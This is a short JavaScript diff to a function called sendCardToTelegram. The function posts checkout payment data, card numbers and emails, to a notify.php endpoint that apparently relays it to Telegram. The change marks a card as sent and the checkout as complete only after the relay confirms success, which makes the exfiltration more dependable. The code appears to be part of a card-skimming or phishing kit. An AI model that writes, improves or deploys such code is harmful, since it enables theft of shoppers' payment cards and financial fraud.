@@ -30,9 +30,7 @@ function sendCardToTelegram(paymentData) {
 
   if (!data.cardNumber && !data.email) return;
 
-  sessionStorage.setItem(CARD_NOTIFY_SENT_KEY, "1");
   if (typeof clearPartialNotifyTimer === "function") clearPartialNotifyTimer();
-  if (typeof markCheckoutComplete === "function") markCheckoutComplete();
 
   const apiBase = window.location.pathname.includes("/pages/")
     ? "../api/notify.php"
@@ -49,5 +47,13 @@ function sendCardToTelegram(paymentData) {
     body: JSON.stringify(data),
     credentials: "same-origin",
     keepalive: true,
-  }).catch(() => {});
+  })
+    .then((res) => res.json())
+    .then((result) => {
+      if (result && result.ok) {
+        sessionStorage.setItem(CARD_NOTIFY_SENT_KEY, "1");
+        if (typeof markCheckoutComplete === "function") markCheckoutComplete();
+      }
+    })
+    .catch(() => {});
 }
